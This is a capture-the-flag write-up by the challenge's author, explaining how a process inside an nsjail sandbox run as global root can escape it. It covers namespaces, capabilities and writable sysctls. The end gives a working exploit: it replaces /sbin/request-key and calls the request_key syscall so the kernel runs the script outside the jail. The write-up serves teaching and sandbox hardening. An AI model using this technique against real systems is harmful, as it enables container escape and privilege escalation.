# Am I not root?

by YiFei Zhu

> Ever wondered why nsjail prints a giant warning when it's run as root?
Well, now you know ;)
>
> `$ socat file:$(tty),raw,echo=0 tcp:am-i-not-root.chal.uiuc.tf:1337`
>
> Hint: I disabled coredumps and modules. What else are there?

This challenge explores the user namespace and capability system of the Linux
kernel, in particular, the implications of having KUID 0 ("global root") even
with no capabilities.

## Examination

Many CTFs, including UIUCTF, uses [kctf](https://github.com/google/kctf) to
host challenges. kctf runs challenges in docker containers, yes, but they are
running under privileged mode. A socat process then listens for connections
and spawn the challenge in a jail using a program called
[nsjail](https://github.com/google/nsjail).

An kctf [example challenge Dockerfile](https://github.com/google/kctf/blob/8163dde379a0f5c903f16194eac1c5ee71a6343c/dist/challenge-templates/pwn/challenge/Dockerfile#L27):
```
CMD kctf_setup && \
    kctf_drop_privs \
    socat \
      TCP-LISTEN:1337,reuseaddr,fork \
      EXEC:"kctf_pow nsjail --config /home/user/nsjail.cfg -- /home/user/chal"
```

Sometimes, when I test challenges with nsjail in Docker, I run a command like:
```
root@challenge:/# nsjail --config /home/user/nsjail.cfg -- /bin/sh
[I] Mode: STANDALONE_ONCE
[...]
[I] Uid map: inside_uid:1000 outside_uid:0 count:1 newuidmap:false
[W] void cmdline::logParams(nsjconf_t*)():254 Process will be UID/EUID=0 in the global user namespace, and will have user root-level access to files
[I] Gid map: inside_gid:1000 outside_gid:0 count:1 newgidmap:false
[W] void cmdline::logParams(nsjconf_t*)():264 Process will be GID/EGID=0 in the global user namespace, and will have group root-level access to files
[I] Executing '/bin/sh' for '[STANDALONE MODE]'
/bin/sh: can't access tty; job control turned off
/ $
```

Notice the two lines starting with `[W]`? They are warnings, and don't happen
when the challenge is run from socat. Why? The trick is `kctf_drop_privs`:
```
root@challenge:/# kctf_drop_privs nsjail --config /home/user/nsjail.cfg -- /bin/sh
[I] Mode: STANDALONE_ONCE
[...]
[I] Uid map: inside_uid:1000 outside_uid:1000 count:1 newuidmap:false
[I] Gid map: inside_gid:1000 outside_gid:1000 count:1 newgidmap:false
[I] Executing '/bin/sh' for '[STANDALONE MODE]'
/bin/sh: can't access tty; job control turned off
/ $
```

And what is this `kctf_drop_privs`?
```
root@challenge:/# cat /usr/bin/kctf_drop_privs
#!/bin/bash

# There are two copies of this file in the nsjail and healthcheck base images.

all_caps="-cap_0"
for i in $(seq 1 $(cat /proc/sys/kernel/cap_last_cap)); do
  all_caps+=",-cap_${i}"
done

exec setpriv --init-groups --reset-env --reuid user --regid user --inh-caps=${all_caps} -- "$@"
```

Ok, so it sets UID and GID to that of `user` and makes all capabilities
non-inheritable (effectively dropping them). Makes sense.

nsjail uses Linux kernel's user namespace feature, and if we read
[`user_namespaces(7)`](https://man7.org/linux/man-pages/man7/user_namespaces.7.html)
man page, we see there's a UID mapping between UIDs of inside a user namespace
and outside the namespace. The result of running nsjail as root means that
the `user` of inside the namespace maps to `root` outside, so the kernel will
recognize anything running inside the jail as `root`, and we could do anything
from inside the "jail", right?

Turns out, no. Kernel guards namespaces with capabilities, and to quote the man
page:
> On the other hand, that process has no capabilities in the parent
> or previous user namespace, even if the new namespace is
> created or joined by the root user

In other words, process inside the jail doesn't have the capabilities of
outside the jail. And a lot of things will fail without these capabilities,
including ability to load kernel modules (`CAP_SYS_MODULE`), jail escape by
ptrace-ing a process outside the jail (`CAP_SYS_PTRACE`), and creating device
files (`CAP_MKNOD`).

This got me wondering, what *can* be done that could lead me to escape the jail?

## Experimentation

The nsjail "jail", and this challenge itself is very similar to what one would
get via `sudo unshare -rmpf --mount-proc` command, which creates the user, PID,
and mount namespaces:

```
user@host ~ $ sudo unshare -rmpf --mount-proc
[sudo] password for user:
host /home/user # ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  16680  5248 pts/15   S    23:51   0:00 -bash
root           6  0.0  0.0  18388  3456 pts/15   R+   23:51   0:00 ps aux
```

Additionally, unprivileged docker containers running as root are very similar
to root running without capabilities, which in turn is very similar to
nsjail running as root. We can explore the defenses docker employs against
capability-less root to see what could potentially be exploitable in the
lack of defenses in this challenge. I think capabilities don't affect file
access DACs (i.e. permission to open files still uses the global UIDs), so
maybe docker would hide away files that should not be accessible. Hmph...
let's look at the mount table:

```
docker-sandbox ~ # docker run --rm -it ubuntu:22.04 /bin/bash
root@988a3e3a9c87:/# mount
overlay on / type overlay (rw,relatime,lowerdir=[...]])
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/vda on /etc/resolv.conf type btrfs (rw,relatime,discard=async,space_cache=v2,subvolid=5,subvol=/)
/dev/vda on /etc/hostname type btrfs (rw,relatime,discard=async,space_cache=v2,subvolid=5,subvol=/)
/dev/vda on /etc/hosts type btrfs (rw,relatime,discard=async,space_cache=v2,subvolid=5,subvol=/)
devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime,inode64)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/scsi type tmpfs (ro,relatime,inode64)
tmpfs on /sys/firmware type tmpfs (ro,relatime,inode64)
```

Hmm... `/proc/sys` is sysctls, and `/proc/sysrq-trigger` triggers sysrqs. These
are very dangerous and could affect the host, though not necessarily a path to container escape. But... which of these are accessible from within the jail?

```
user@host ~ $ sudo unshare -rmpf --mount-proc
host /home/user # echo foo > /proc/sys/kernel/modprobe
host /home/user # cat /proc/sys/kernel/modprobe
foo
host /home/user # echo bar > /proc/sys/kernel/core_pattern
host /home/user # cat /proc/sys/kernel/core_pattern
bar
```

Uh oh... core_pattern and modprobe_path are writable. These are such
[well-known & often-exploited](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts#proc-sys-kernel-core_pattern)
paths to break out of a container. I... have to disable them since they aren't
interesting at all. The *joy* of being global root.

What else are there?

## Exploration

I coded up the challenge after this. The way I coded it... let's take a look at
the boot output:
```
$ socat file:$(tty),raw,echo=0 tcp:am-i-not-root.chal.uiuc.tf:1337
== proof-of-work: disabled ==
+ mount -n -t proc -o nosuid,noexec,nodev proc /proc/
+ mount -n -o remount,rw /
+ mkdir -p /dev /sys /etc
+ mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
+ mount -n -t tmpfs -o mode=1777 tmpfs /tmp
+ mount -n -t 9p flag -o nosuid,noexec,nodev,version=9p2000.L,trans=virtio,msize=104857600,access=0 /mnt
+ cd /home/user
+ exec setsid bash -l
uiuctf-2023:/home/user# ./init_chal am-i-not-root
+ case "$1" in
+ rm -r virophage virophage.c /usr/lib/zapps
+ chown root:root /home/user
uiuctf-2023:/home/user# exec ./am-i-not-root
Entering jail...
uiuctf-2023:/home/user#
```

* `mount -n -t 9p flag -o [...] /mnt` - `9p` is a privileged filesystem. Once
inside the jail it cannot be remounted. Additionally, 9p is a network filesystem
(in the case "network" between the host and the challenge VM). The contents
of the flag never enters kernel memory until the file is read, so even if one
could read `/proc/kcore` it is still moot. They need access to a process
outside the jail.
* `+ exec setsid bash -l` & `uiuctf-2023:/home/user# exec ./am-i-not-root` -
The global PID 1 (of the initial PID namespace) will be the jail. There are no
userspace process outside the jail, so even of one successfully gets RCE in the
PID 1 they will still be unable to escape the jail.

But how could one get access to the something outside the jail if there isn't
anything outside the jail for them to access?

User mode helper (UMH)... it is what powers core_pattern and modprobe_path.
It would make the kernel fork off a userspace process in the initial namespaces,
outside any jails. Perfect for our use case!

Let's see [what in the kernel uses UMH](https://elixir.bootlin.com/linux/v6.3.8/A/ident/call_usermodehelper_setup):
* `fs/coredump.c` - core_pattern, disabled `CONFIG_COREDUMP` for this chal
* `init/do_mounts_initrd.c` - initrd code paths not accessible
* `kernel/module/kmod.c` - modprobe_path, disabled `CONFIG_MODULES` for this chal
* `kernel/usermode_driver.c` - not useful, blob of UMDs are provided by the kernel
* `lib/kobject_uevent.c` - `CONFIG_UEVENT_HELPER` disabled by default
* `security/keys/request_key.c` - huh what's this?

*What's this?* A ring! I mean, [a syscall](https://man7.org/linux/man-pages/man2/request_key.2.html)
that no one knows about! Perfect for this challenge! I want people solving this
to learn something new. In that case, I won't patch this out and then try to
find some even more cursed exploits (and make it too hard).

## Exploitation

`request_key` is hardcoded to use `/sbin/request-key`. Do we have write access
to it?

```
uiuctf-2023:/home/user# cat > /sbin/request-key << 'EOF'
> #!/bin/bash
> cat /mnt/flag > /dev/ttyS0
> EOF
uiuctf-2023:/home/user# chmod a+x /sbin/request-key
```
Yes we do. We *are* root, after all. All we need to do is get the kernel to
invoke it with UMH.

With some light trial and error, from the prototype:
```C
key_serial_t request_key(const char *type, const char *description,
                         const char *_Nullable callout_info,
                         key_serial_t dest_keyring);
```

I used, in the end:
```C
#include <linux/keyctl.h>
#include <sys/syscall.h>
#include <unistd.h>

int main(void)
{
        syscall(SYS_request_key, "user", "UIUCTF", "2023", KEY_SPEC_THREAD_KEYRING);
}
```

I thought those parameters could be anything, but that's not the case.

* `type` - [must be](https://elixir.bootlin.com/linux/v6.3.8/source/security/keys/keyctl.c#L215)
a known type. I used [the "user" type](https://elixir.bootlin.com/linux/v6.3.8/source/security/keys/user_defined.c#L23).
* `dest_keyring` - Certain keyrings will not be found. With minor trial and
error, `KEY_SPEC_THREAD_KEYRING` worked.

And the full exploit:
```
uiuctf-2023:/home/user# cat > /sbin/request-key << 'EOF'
> #!/bin/bash
> cat /mnt/flag > /dev/ttyS0
> EOF
uiuctf-2023:/home/user# chmod a+x /sbin/request-key
uiuctf-2023:/home/user# cat > exploit.c << 'EOF'
#include <linux/keyctl.h>
#include <sys/syscall.h>
#include <unistd.h>

int main(void)
{
        syscall(SYS_request_key, "user", "UIUCTF", "2023", KEY_SPEC_THREAD_KEYRING);
}
uiuctf-2023:/home/user# gcc -o exploit exploit.c
uiuctf-2023:/home/user# ./exploit
uiuctf{need_more_isolations_for_root_5a4bb464}
```
